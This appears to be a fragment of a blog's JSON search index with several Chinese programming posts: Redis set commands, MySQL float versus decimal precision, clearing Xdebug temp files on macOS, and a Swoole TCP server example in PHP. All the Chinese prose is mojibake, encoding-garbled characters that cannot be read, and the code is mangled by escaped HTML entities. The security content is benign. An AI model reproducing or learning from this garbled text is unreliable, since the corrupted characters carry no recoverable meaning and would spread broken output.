seté›†åˆç‰¹ç‚¹ï¼š æ— åº ä¸å…è®¸é‡å¤ åº”ç”¨åœºæ™¯ saddï¼šTagging spop/srandmemberï¼šRandom item add + sinterï¼šSocial Graph å¿«é€Ÿä¸Šæ‰‹ sorted set åº”ç”¨åœºæ™¯ zscoreï¼štimeStampã€saleCountã€followCount å¿«é€Ÿä¸Šæ‰‹ åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆçš„åŒºåˆ« æ•°æ®ç»“æ„ æ˜¯å¦å…è®¸å…ƒç´ é‡ æ˜¯å¦æœ‰åº æœ‰åºå®ç°æ–¹å¼ åº”ç”¨åœºæ™¯ åˆ—è¡¨ æ˜¯ æ˜¯ ç´¢å¼•ä¸‹æ ‡ æ—¶é—´è½´ï¼Œæ¶ˆæ¯é˜Ÿåˆ— é›†åˆ å¦ å¦ æ—  æ ‡ç­¾ï¼Œç¤¾äº¤ æœ‰åºé›†åˆ å¦ æ˜¯ åˆ†å€¼ æ’è¡Œæ¦œï¼Œç‚¹èµæ•° é€šç”¨å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰keyï¼š 1keys * æŸ¥çœ‹åŠ è½½é…ç½®æ–‡ä»¶ï¼š 1config get * å½“å‰æ•°æ®åº“çš„ key çš„æ•°é‡ï¼š 1dbsize åˆ¤æ–­key æ˜¯å¦å­˜åœ¨ï¼š 1exists key åˆ é™¤keyï¼š 1del key æŸ¥çœ‹key çš„ç±»å‹ï¼š 1type key æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼š 1info memory","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Mysql å¦‚ä½•é€‰æ‹© Floatã€Doubleã€Decimal","slug":"how-does-mysql-choose-float-double-decimal","date":"2020-11-06T14:25:45.000Z","updated":"2020-12-01T14:22:22.489Z","comments":true,"path":"how-does-mysql-choose-float-double-decimal/","link":"","permalink":"https://www.0x2beace.com/how-does-mysql-choose-float-double-decimal/","excerpt":"æˆ‘ä»¬çŸ¥é“åœ¨Mysql ä¸­å­˜å‚¨å°æ•°æœ‰ä¸‰ç§æ•°æ®ç±»å‹å¯åšé€‰æ‹©ï¼Œç©¶ç«Ÿè¯¥é€‰æ‹©å“ªä¸€ç§æ•°æ®æ ¼å¼ï¼Œå…¶å®å¹¶æ²¡æœ‰ç»Ÿä¸€çš„ç­”æ¡ˆï¼Œå¾—æ ¹æ®å®é™…åœºæ™¯å»åˆ†æï¼Œå“ªä¸€ç§æ›´åˆé€‚ã€‚","text":"æˆ‘ä»¬çŸ¥é“åœ¨Mysql ä¸­å­˜å‚¨å°æ•°æœ‰ä¸‰ç§æ•°æ®ç±»å‹å¯åšé€‰æ‹©ï¼Œç©¶ç«Ÿè¯¥é€‰æ‹©å“ªä¸€ç§æ•°æ®æ ¼å¼ï¼Œå…¶å®å¹¶æ²¡æœ‰ç»Ÿä¸€çš„ç­”æ¡ˆï¼Œå¾—æ ¹æ®å®é™…åœºæ™¯å»åˆ†æï¼Œå“ªä¸€ç§æ›´åˆé€‚ã€‚ åœºæ™¯é‡ç°å…ˆæ¥çœ‹è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾ç›®å‰æœ‰ä¸€å¼ è¡¨ç”¨æ¥å­˜å‚¨ç”¨æˆ·çš„ç§¯åˆ† 123CREATE TABLE &#96;table1&#96; ( &#96;integral&#96; float(10,2) DEFAULT NULL) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; ç„¶åå‘è¿™å¼ è¡¨ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼š 12345678910mysql&gt; INSERT INTO &#96;table1&#96; (&#96;integral&#96;) VALUES (131072.32);Query OK, 1 row affected (0.00 sec)mysql&gt; SELECT * FROM &#96;table1&#96;;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec) é€šè¿‡æŸ¥è¯¢æ•°æ®è¡¨å¯ä»¥çœ‹åˆ°è¯¥æ¡è®°å½•å¹¶ä¸æ˜¯131072.32 è€Œæ˜¯131072.31ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿè¿™ä¸ªé—®é¢˜é—´æ¥æš´éœ²å‡ºäº†å…¶ä»–ä»€ä¹ˆé—®é¢˜ï¼Ÿ ä¸¢å¤±æ•°æ®æ˜¯å¦æ˜¯æ­£å¸¸ç°è±¡ï¼Ÿ ä¸ºä»€ä¹ˆä¼šå°‘0.01ï¼Œæœ‰æ²¡æœ‰å¯èƒ½å°‘0.02ï¼Œæˆ–è€…å°‘1ï¼Œå°‘10ç”šè‡³å°‘100ï¼Ÿ æ€ä¹ˆæ ·æ‰èƒ½è®©æˆ‘ä»¬çš„æ•°æ®å°½é‡å‡†ç¡®ï¼Ÿ ç²¾åº¦æ˜¯å¦‚ä½•ä¸¢å¤±çš„æ•°å€¼ç±»å‹å­˜å‚¨éœ€æ±‚|åˆ—ç±»å‹|å­˜å‚¨éœ€æ±‚|åˆ†é…å†…å­˜ç©ºé—´||-|-|-||FLOAT(p)|å¦‚æœ0 &lt;= p &lt;= 24ä¸º4ä¸ªå­—èŠ‚, å¦‚æœ25 &lt;= p &lt;= 53ä¸º8ä¸ªå­—èŠ‚|32,64||FLOAT|4ä¸ªå­—èŠ‚|32||DOUBLE [PRECISION], item REAL|8ä¸ªå­—èŠ‚|64||DECIMAL(M,D), NUMERIC(M,D)|å˜é•¿|| é€šè¿‡æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è®¡ç®—æœºçš„ä¸–ç•Œä¸­ï¼Œæµ®ç‚¹æ•°è¿›è¡Œå­˜å‚¨æ—¶ï¼Œå¿…é¡»è¦å…ˆè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œé€šä¿—ä¸€ç‚¹è®²ä¹Ÿå°±æ˜¯æµ®ç‚¹æ•°çš„ç²¾åº¦å®é™…ä¸Šæ˜¯ç”±äºŒè¿›åˆ¶çš„ç²¾åº¦æ¥å†³å®šçš„ã€‚ æˆ‘ä»¬çŸ¥é“å¯¹äºfloatç±»å‹çš„æ•°æ®ï¼Œåªåˆ†é…äº†32ä½çš„å­˜å‚¨ç©ºé—´ï¼Œå¯¹äºdoubleç±»å‹å€¼åˆ†é…äº†64ä½ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„å®æ•°éƒ½èƒ½è½¬æˆ32ä½æˆ–è€…64ä½çš„äºŒè¿›åˆ¶å½¢å¼ï¼Œå¦‚æœè¶…è¿‡äº†ï¼Œå°±ä¼šå‡ºç°æˆªæ–­ï¼Œè¿™å°±æ˜¯è¯¯å·®çš„æ¥æºã€‚ æ¯”å¦‚å°†ä¸Šé¢ä¾‹å­ä¸­çš„ 131072.32 è½¬æˆäºŒè¿›åˆ¶åçš„æ•°æ®ä¸ºï¼š 1100000000000000000.0101000111101011100001010001111010111000010100011111â€¦ è¿™æ˜¯ä¸€ä¸ªæ— ç©·æ•°ï¼Œå¯¹äºfloat ç±»å‹ï¼Œåªèƒ½æˆªå–å‰32ä½è¿›è¡Œå­˜å‚¨ï¼Œå¯¹äºdoubleåªèƒ½æˆªå–å‰64ä½è¿›è¡Œå­˜å‚¨ã€‚ å¯¹äº float è€Œè¨€ï¼Œæœ€ç»ˆå­˜å‚¨çš„å€¼æ˜¯ï¼š01001000000000000000000000010100 å¯¹äº double è€Œè¨€ï¼Œæœ€ç»ˆå­˜å‚¨çš„å€¼æ˜¯ï¼š0100000100000000000000000000001010001111010111000010100011110101 æ‰€ä»¥æˆ‘ä»¬æš‚æ—¶å¯ä»¥å¾—å‡ºä¸€ä¸ªç»“è®ºï¼š è®¤è¯†Floatã€DecimalFloat å’Œ Decimal è¿™ç±»æ•°æ®ç±»å‹éƒ½å¯ä»¥é€šè¿‡ä¸¤ä½å‚æ•°æ¥æ§åˆ¶å…¶ç²¾åº¦ã€‚ å…¶å­˜å‚¨æ ¼å¼æ˜¯ï¼š 1FLOAT&#x2F;DECIMAIL [(M,D)] [UNSIGNED] [ZEROFILL] å¸¸è§è¯¯åŒº ç²¾åº¦æ€»èƒ½ç²¾ç¡®åˆ°D ä½ã€‚ å­˜å‚¨ç©ºé—´å¤§å°å†³å®šå­˜å‚¨ç²¾åº¦ï¼Œå’ŒDå€¼æ— å…³ï¼ŒFloat çš„å­˜å‚¨ç©ºé—´åªæœ‰32 ä½ï¼Œå½“éœ€è¦å­˜å‚¨çš„äºŒè¿›åˆ¶å¤§äº32 ä½æ—¶ï¼Œå°±ä¼šæˆªæ–­ï¼ˆå››èˆäº”å…¥ï¼‰ã€‚ 12345678910111213mysql&gt; create table table2 (integral float(15,2));Query OK, 0 rows affected (0.02 sec)mysql&gt; insert into table2 values (123456789.39);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table2;+--------------+| integral |+--------------+| 123456792.00 |+--------------+1 row in set (0.00 sec) æ•°æ®å­˜å‚¨åªèƒ½å­˜å‚¨åˆ°D ä½ æµ®ç‚¹å‹æ•°æ®æœ€ç»ˆéƒ½è¦è¢«è½¬æˆäºŒè¿›åˆ¶è¿›è¡Œå­˜å‚¨ã€‚å¹¶ä¸”å¯¹äºfloat è€Œè¨€ï¼Œå­˜å‚¨ç±»å‹åªèƒ½æ˜¯32ä½0å’Œ1çš„ç»„åˆã€‚ 12345678910111213141516171819mysql&gt; select * from table1;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec)mysql&gt; alter table table1 modify integral float(10,4);Query OK, 0 rows affected (0.00 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; select * from table1;+-------------+| integral |+-------------+| 131072.3125 |+-------------+1 row in set (0.00 sec) DECIMAL(M,D)ä¸­ï¼ŒD å€¼çš„æ˜¯å°æ•°éƒ¨åˆ†çš„ä½æ•°ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå½“ä¿®æ”¹äº†D çš„å€¼ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹åˆ°MySQL çœŸæ­£å­˜å‚¨çš„æ•°å€¼ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ã€‚ int(3)/int(5) åŒºåˆ« æ­£å¸¸æ˜¾ç¤ºæ²¡æœ‰åŒºåˆ«ã€‚ 3 å’Œ 5 ä»…æ˜¯æœ€å°æ˜¾ç¤ºå®½åº¦è€Œå·²ï¼Œå¹¶ä¸ä»£è¡¨æœ€å¤šå­˜å‚¨å®½åº¦ã€‚ æœ‰ zerofill ç­‰æ‰©å±•å±æ€§æ—¶åˆ™æ˜¾ç¤ºæœ‰åŒºåˆ«ã€‚ æ€»ç»“ï¼š è‹¥æ’å…¥çš„å€¼æœªæŒ‡å®šå°æ•°éƒ¨åˆ†æˆ–è€…å°æ•°éƒ¨åˆ†ä¸è¶³D ä½åˆ™ä¼šè‡ªåŠ¨è¡¥åˆ°D ä½å°æ•°ã€‚ è‹¥æ’å…¥çš„å€¼å°æ•°éƒ¨åˆ†è¶…è¿‡äº†D ä¸ºåˆ™ä¼šå‘ç”Ÿæˆªæ–­ï¼Œæˆªå–å‰D ä½å°æ•°(å››èˆäº”å…¥æˆªå–)ã€‚ M å€¼æŒ‡æ˜¯æ•´æ•°éƒ¨åˆ†åŠ å°æ•°éƒ¨åˆ†çš„æ€»é•¿åº¦ï¼Œä¹Ÿå³æ’å…¥çš„æ•°å­—æ•´æ•°éƒ¨åˆ†ä¸èƒ½è¶…è¿‡M-D ä½ï¼Œå¦åˆ™ä¸èƒ½æˆåŠŸæ’å…¥ï¼Œä¼šæŠ¥è¶…å‡ºèŒƒå›´çš„é”™è¯¯ã€‚ å¦‚ä½•é€‰æ‹©Floatã€Doubleã€Decimalå‚è€ƒé“¾æ¥ MySQLå¦‚ä½•é€‰æ‹©float, double, decimal","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mac ä¸´æ—¶æ–‡ä»¶å ç”¨è¿‡å¤šç£ç›˜ç©ºé—´","slug":"mac-temporary-files-take-up-too-much-disk-space","date":"2020-11-05T12:09:58.000Z","updated":"2020-11-07T07:58:37.436Z","comments":true,"path":"mac-temporary-files-take-up-too-much-disk-space/","link":"","permalink":"https://www.0x2beace.com/mac-temporary-files-take-up-too-much-disk-space/","excerpt":"æœ€è¿‘ä½¿ç”¨Mac æ—¶ï¼Œè¢«å‘ŠçŸ¥ç£ç›˜ç©ºé—´ä¸¥é‡ä¸è¶³äº†ï¼Œæˆ‘å¿ƒæƒ³æœ€è¿‘åˆæ²¡æœ‰ä¸‹è½½ä»€ä¹ˆå¤§æ–‡ä»¶ï¼Œæ€ä¹ˆä¼šçªç„¶æ»¡ç›˜äº†ã€‚","text":"æœ€è¿‘ä½¿ç”¨Mac æ—¶ï¼Œè¢«å‘ŠçŸ¥ç£ç›˜ç©ºé—´ä¸¥é‡ä¸è¶³äº†ï¼Œæˆ‘å¿ƒæƒ³æœ€è¿‘åˆæ²¡æœ‰ä¸‹è½½ä»€ä¹ˆå¤§æ–‡ä»¶ï¼Œæ€ä¹ˆä¼šçªç„¶æ»¡ç›˜äº†ã€‚ äºæ˜¯ä½¿ç”¨DaisyDisk æ‰«æäº†ä¸€ä¸‹ç£ç›˜ç©ºé—´ï¼Œå‘ç°å…¶ä¸­å¤šè¾¾ 186 G å…¨æ˜¯ä¸´æ—¶æ–‡ä»¶ã€‚ èµ·åˆä»¥ä¸ºæ˜¯ç³»ç»Ÿäº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ã€‚å› ä¸ºå¹¶ä¸çŸ¥é“è¿™äº›æ–‡ä»¶æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæ‰€ä»¥ä¹Ÿä¸å¤ªæ•¢ç›´æ¥åˆ é™¤ï¼Œåªå°è¯•è¿‡é‡å¯ç”µè„‘ä½†å¹¶æ²¡æœ‰ç”¨ã€‚ åæ¥é€šè¿‡Apple ç¤¾åŒºæé—®æ‰äº†è§£åˆ°ï¼ŒåŸæ¥cachegrind.out è¿™ç±»æ–‡ä»¶å…¨æ˜¯ Xdebug çš„è¾“å‡ºæ–‡ä»¶ï¼æ‰€ä»¥æ˜¯å¯ä»¥ç›´æ¥åˆ é™¤æ‰çš„ï½ æ­¤å‰ä»æœªæ¸…ç†è¿‡è¿™ç±»æ–‡ä»¶ï¼Œæ‰€ä»¥æ‰ä¼šå¯¼è‡´ä¸´æ—¶æ–‡ä»¶å¦‚æ­¤ä¹‹å¤§â€¦ å¯ä»¥æ‰“å¼€ç»ˆç«¯ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ¸…ç†ï¼š 1234sudo rm -rf &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*# æˆ–è€…sudo find &#x2F;private&#x2F;var&#x2F;tmp -name &quot;cachegrind*&quot; -exec rm -rf &#123;&#125; \\; å› ä¸ºæœ¬åœ°åº”ç”¨çš„Xdebug ä¸€ç›´éƒ½æ˜¯å¼€å¯ç€çš„ï¼Œæ‰€ä»¥è¯·æ±‚è¯¥åº”ç”¨æ—¶ï¼ŒXdebug å°±ä¼šå°†è°ƒè¯•ä¿¡æ¯è¾“å‡ºè‡³ä¸´æ—¶æ–‡ä»¶äº†ï¼Œå¦‚å›¾ï¼š","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Swoole åŸºç¡€çŸ¥è¯†å­¦ä¹ ","slug":"swoole-basic-knowledge-learning","date":"2020-11-03T14:33:46.000Z","updated":"2020-11-03T14:35:50.059Z","comments":true,"path":"swoole-basic-knowledge-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-basic-knowledge-learning/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•Swoole åŸºç¡€çŸ¥è¯†çš„å­¦ä¹ ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•Swoole åŸºç¡€çŸ¥è¯†çš„å­¦ä¹ ã€‚ Masterã€Managerã€Workerã€ReactorMasterMaster è¿›ç¨‹æ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹è¿›ç¨‹ã€‚ Manager è¿›ç¨‹è´Ÿè´£åˆ›å»º / å›æ”¶ worker/task è¿›ç¨‹ Worker è¿›ç¨‹ æ¥å—ç”± Reactor çº¿ç¨‹æŠ•é€’çš„è¯·æ±‚æ•°æ®åŒ…ï¼Œå¹¶æ‰§è¡Œ PHP å›è°ƒå‡½æ•°å¤„ç†æ•°æ® ç”Ÿæˆå“åº”æ•°æ®å¹¶å‘ç»™ Reactor çº¿ç¨‹ï¼Œç”± Reactor çº¿ç¨‹å‘é€ç»™ TCP å®¢æˆ·ç«¯ å¯ä»¥æ˜¯å¼‚æ­¥éé˜»å¡æ¨¡å¼ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒæ­¥é˜»å¡æ¨¡å¼ Worker ä»¥å¤šè¿›ç¨‹çš„æ–¹å¼è¿è¡Œ Reactor çº¿ç¨‹ Reactor çº¿ç¨‹æ˜¯åœ¨ Master è¿›ç¨‹ä¸­åˆ›å»ºçš„çº¿ç¨‹ è´Ÿè´£ç»´æŠ¤å®¢æˆ·ç«¯ TCP è¿æ¥ã€å¤„ç†ç½‘ç»œ IOã€å¤„ç†åè®®ã€æ”¶å‘æ•°æ® ä¸æ‰§è¡Œä»»ä½• PHP ä»£ç  å°† TCP å®¢æˆ·ç«¯å‘æ¥çš„æ•°æ®ç¼“å†²ã€æ‹¼æ¥ã€æ‹†åˆ†æˆå®Œæ•´çš„ä¸€ä¸ªè¯·æ±‚æ•°æ®åŒ… æœ‰ä¸€ä¸ªæ›´åŠ é€šä¿—çš„æ¯”å–»æ¥æè¿°è¿™ä¸‰è€…çš„å…³ç³»ï¼šå‡è®¾ Server å°±æ˜¯ä¸€ä¸ªå·¥å‚ï¼Œé‚£ Reactor å°±æ˜¯é”€å”®ï¼Œæ¥å—å®¢æˆ·è®¢å•ã€‚è€Œ Workerå°±æ˜¯å·¥äººï¼Œå½“é”€å”®æ¥åˆ°è®¢å•åï¼ŒWorkerå»å·¥ä½œç”Ÿäº§å‡ºå®¢æˆ·è¦çš„ä¸œè¥¿ï¼Œè€Œ TaskWorker å¯ä»¥ç†è§£ä¸ºè¡Œæ”¿äººå‘˜ï¼Œå¯ä»¥å¸®åŠ© Worker å¹²äº›æ‚äº‹ï¼Œè®© Workerä¸“å¿ƒå·¥ä½œã€‚ å…¶ä»–IPv4 ä½¿ç”¨ 127.0.0.1 è¡¨ç¤ºç›‘å¬æœ¬æœºï¼Œ0.0.0.0 è¡¨ç¤ºç›‘å¬æ‰€æœ‰åœ°å€IPv6 ä½¿ç”¨::1 è¡¨ç¤ºç›‘å¬æœ¬æœºï¼Œ:: (ç›¸å½“äº 0:0:0:0) è¡¨ç¤ºç›‘å¬æ‰€æœ‰åœ°å€ TCP åè®®TCP (Transmission Control Protocol ä¼ è¾“æ§åˆ¶åè®®ï¼‰åè®®æ˜¯ä¸€ç§é¢å‘è¿æ¥çš„ï¼Œå¯é çš„ï¼ŒåŸºäºå­—èŠ‚æµçš„ä¼ è¾“é€šä¿¡åè®®ã€‚ UDP åè®®UDP (User Datagram Protocol ç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰æ˜¯ä¸€ç§æ— è¿æ¥çš„ä¼ è¾“å±‚åè®®ï¼Œæä¾›é¢å‘äº‹åŠ¡çš„ç®€å•ä¸å¯é ä¿¡æ¯ä¼ é€æœåŠ¡ã€‚ UDP æœåŠ¡å™¨ä¸ TCP æœåŠ¡å™¨ä¸åŒï¼ŒUDP æ²¡æœ‰è¿æ¥çš„æ¦‚å¿µã€‚å¯åŠ¨ Server åï¼Œå®¢æˆ·ç«¯æ— éœ€ Connectï¼Œç›´æ¥å¯ä»¥å‘ Server ç›‘å¬çš„ 9502 ç«¯å£å‘é€æ•°æ®åŒ…ã€‚ å¸¸è§é—®é¢˜TCP â€œç²˜åŒ…â€é—®é¢˜é¦–å…ˆæ¥è§£é‡Šä»¥ä¸‹æ‰€è°“çš„â€œç²˜åŒ…â€é—®é¢˜å…¶æœ¬è´¨æ˜¯ä»€ä¹ˆã€‚ æœåŠ¡ç«¯å»ºç«‹æœåŠ¡ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·è¿æ¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„æ¯æ¬¡ sendï¼Œå®¢æˆ·ç«¯éƒ½èƒ½æ­£å¸¸ recvã€‚ä½†åœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„ä¸¤æ¬¡send æˆ–è€…æ›´å¤šæ¬¡ snedï¼Œå®¢æˆ·ç«¯å¯èƒ½ä¸€æ¬¡å°± recväº†ã€‚ æ‰€ä»¥è¿™å°±å¯¼è‡´â€œç²˜åŒ…â€é—®é¢˜çš„äº§ç”Ÿã€‚ TCP åè®®çš„æœ¬è´¨æ˜¯æµåè®®ï¼Œå®ƒåªä¼šä¿è¯ä¿è¯å‘é€æ–¹ä»¥ä»€ä¹ˆé¡ºåºå‘é€å­—èŠ‚ï¼Œæ¥æ”¶æ–¹å°±ä¸€å®šèƒ½æŒ‰è¿™ä¸ªé¡ºåºæ¥æ”¶åˆ°ã€‚æ‰€ä»¥æ‰€è°“çš„â€œç²˜åŒ…â€é—®é¢˜ä¸åº”è¯¥æ˜¯ä¼ è¾“å±‚çš„é—®é¢˜ï¼Œè€Œæ˜¯åº”ç”¨å±‚çš„é—®é¢˜ã€‚ æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨çš„ç®€å•æ£€æµ‹æ‰‹æ®µ åœ¨ Linux ä¸‹ï¼Œä½¿ç”¨ netstat -an | grep ç«¯å£ï¼ŒæŸ¥çœ‹ç«¯å£æ˜¯å¦å·²ç»è¢«æ‰“å¼€å¤„äº Listening çŠ¶æ€ ä¸Šä¸€æ­¥ç¡®è®¤åï¼Œå†æ£€æŸ¥é˜²ç«å¢™é—®é¢˜ï¼Œè¿™é‡Œçš„é˜²ç«å¢™æŒ‡çš„æ˜¯æœºå™¨æœ¬èº«çš„é˜²ç«å¢™ï¼Œå¦‚æœæ˜¯äº‘æœåŠ¡å™¨ï¼Œé‚£ä¹ˆè¿˜åŒ…æ‹¬äº‘çš„é˜²ç«å¢™ã€‚ æ³¨æ„æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„ IP åœ°å€ï¼Œå¦‚æœæ˜¯ 127.0.0.1 å›ç¯åœ°å€ï¼Œåˆ™å®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨ 127.0.0.1 æ‰èƒ½è¿æ¥ä¸Šï¼Œæ‰€ä»¥å¦‚æœå¸Œæœ›å…¶ä»–æœºå™¨ä¹Ÿèƒ½è®¿é—®æœ¬æœºï¼Œé‚£å°±ä½¿ç”¨0.0.0.0ã€‚ å‚è€ƒé“¾æ¥ æ€ä¹ˆè§£å†³TCPç½‘ç»œä¼ è¾“ã€Œç²˜åŒ…ã€é—®é¢˜ï¼Ÿ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole Tcp å­¦ä¹ ","slug":"swoole-tcp-learning","date":"2020-11-02T15:22:49.000Z","updated":"2020-11-02T15:40:47.308Z","comments":true,"path":"swoole-tcp-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-tcp-learning/","excerpt":"æœ€è¿‘ä¸€ç›´åœ¨å­¦ä¹ Swooleï¼Œåˆšå¥½æœ‰ä¸ªè€é¡¹ç›®çš„ä¸€å°éƒ¨åˆ†(ä¸€ä¸ªè„šæœ¬)æœ‰ç”¨åˆ°äº†Tcp åè®®ï¼Œå€Ÿæ­¤æœºä¼šé‡æ„ä¸€ä¸‹ã€‚","text":"æœ€è¿‘ä¸€ç›´åœ¨å­¦ä¹ Swooleï¼Œåˆšå¥½æœ‰ä¸ªè€é¡¹ç›®çš„ä¸€å°éƒ¨åˆ†(ä¸€ä¸ªè„šæœ¬)æœ‰ç”¨åˆ°äº†Tcp åè®®ï¼Œå€Ÿæ­¤æœºä¼šé‡æ„ä¸€ä¸‹ã€‚ åœºæ™¯æè¿°ï¼šè¯¥è„šæœ¬çš„ä½œç”¨ç”¨ä¸€å¥è¯å°±å¯ä»¥æ¦‚è¿°ï¼šå°†æœ¬åœ°æ•°æ®æºæ¨é€ç»™å¦å¤–ä¸€å°æœåŠ¡å™¨ã€‚ åŸå§‹çš„å¤„ç†æ–¹å¼ï¼Œä¸åˆç†çš„åœ°æ–¹æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š ç›®æ ‡æœåŠ¡å™¨éœ€è¦å¼€æ”¾æŒ‡å®šç«¯å£ï¼Œè¿™ä¼šå¯¼è‡´ç›®æ ‡æœåŠ¡å™¨å‘å¤–æš´éœ²ï¼Œä¸å®‰å…¨ã€‚ å¦‚æœæœ‰å¤šå°ç›®æ ‡æœåŠ¡å™¨ï¼Œè¿™ä¼šå¯¼è‡´é¢‘ç¹éœ€è¦ä¿®æ”¹æºç ï¼Œè„šæœ¬ç»´æŠ¤èµ·æ¥ä¸æ–¹ä¾¿ã€‚ é‡æ„é‡æ„éœ€è¦è§£å†³çš„é—®é¢˜æœ‰å¦‚ä¸‹ï¼š å½“å®¢æˆ·ç«¯è¿æ¥æˆåŠŸåï¼Œæ‰ä¼šå‘è¯¥å®¢æˆ·ç«¯æ¨é€æ•°æ®ã€‚ å½“å®¢æˆ·ç«¯æ–­å¼€è¿æ¥æ—¶ï¼Œåœæ­¢å‘è¯¥å®¢æˆ·ç«¯æ¨é€æ•°æ®ã€‚ å…è®¸å¤šä¸ªå®¢æˆ·ç«¯åŒæ—¶è¿æ¥ã€‚ å› ä¸ºæ•°æ®æºæ˜¯ä¸é—´æ–­çš„ï¼Œç†è®ºä¸Šåªè¦å®¢æˆ·ç«¯çš„è¿æ¥ä¸ä¸»åŠ¨æ–­å¼€ï¼ŒæœåŠ¡ç«¯çš„æ•°æ®æ¨é€å°±ä¸ä¼šä¸»åŠ¨åœæ­¢ã€‚ æœ€ç»ˆä½¿ç”¨Swoole çš„Tcp + Process å®ç°äº†ä»¥ä¸Šéœ€æ±‚ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpuse Swoole\\Process;&#x2F;** * åˆ›å»ºServer å¯¹è±¡ï¼Œç›‘å¬æœ¬åœ° 9501 ç«¯å£ã€‚ *&#x2F;$server &#x3D; new Swoole\\Server(&quot;0.0.0.0&quot;, 9501);$workers &#x3D; [];&#x2F;** * ç›‘å¬è¿æ¥è¿›å…¥äº‹ä»¶ *&#x2F;$server-&gt;on(&quot;Connect&quot;, function ($server, $fd) &#123; global $workers; &#x2F;&#x2F; åˆ›å»ºå­è¿›ç¨‹ $process &#x3D; new swoole_process(function (swoole_process $worker) use ($server, $fd) &#123; echo &quot;Client Connect&quot; . PHP_EOL; &#x2F;&#x2F; todo ä¸šåŠ¡é€»è¾‘ ... &#x2F;&#x2F; å‘å®¢æˆ·ç«¯æ¨é€æ¶ˆæ¯ $server-&gt;send($fd, $str); &#125;, true, 0, false); &#x2F;&#x2F; å¯åŠ¨å­è¿›ç¨‹ $pid &#x3D; $process-&gt;start(); array_push($workers, [&quot;pid&quot; &#x3D;&gt; $pid, &quot;fd&quot; &#x3D;&gt; $fd]);&#125;);&#x2F;** * ç›‘å¬æ•°æ®æ¥æ”¶äº‹ä»¶ *&#x2F;$server-&gt;on(&quot;Receive&quot;, function ($server, $fd, $from_id, $data)&#123; $server-&gt;send($fd, &quot;Server: &quot; . $data);&#125;);&#x2F;** * ç›‘å¬è¿æ¥å…³é—­äº‹ä»¶ *&#x2F;$server-&gt;on(&quot;Close&quot;, function ($server, $fd) &#123; global $workers; foreach ($workers as $worker) &#123; if ($worker[&#39;fd&#39;] &#x3D;&#x3D;&#x3D; $fd)&#123; &#x2F;&#x2F; æ£€æŸ¥å­è¿›ç¨‹æ˜¯å¦å­˜åœ¨ if (Process::kill($worker[&#39;pid&#39;], 0))&#123; array_shift($worker); &#x2F;&#x2F; é€šè¿‡ä¿¡å·ç»ˆæ­¢å­è¿›ç¨‹ Process::kill($worker[&#39;pid&#39;], SIGKILL); &#125; &#125; &#125; echo &quot;Client Close&quot; . PHP_EOL;&#125;);&#x2F;&#x2F; å¯åŠ¨TCP æœåŠ¡å™¨$server-&gt;start(); å…¶å®å®ç°çš„åŸç†å¾ˆç®€å•ï¼Œåˆ©ç”¨Swoole çš„åŸºäºäº‹ä»¶çš„ Tcp 